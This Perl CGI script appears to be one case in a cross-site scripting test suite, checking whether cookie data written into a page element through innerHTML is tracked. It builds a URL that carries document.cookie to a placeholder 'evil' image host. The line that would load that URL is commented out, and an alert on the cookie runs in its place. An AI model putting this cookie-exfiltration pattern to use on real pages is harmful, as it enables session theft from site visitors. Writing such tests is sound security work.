#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests storing in dom-innerHTML";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		var dut = "never evil";
		
		document.getElementById("testptag").innerHTML = $evil;
		
		dut = document.getElementById("testptag").innerHTML;
		
		var url = "$imgevilurl?normal=" + dut;
//		document.images[0].src = url;
		alert(document.cookie);
		
		
    </script>
|;

require "xss_basic_footer.pl";
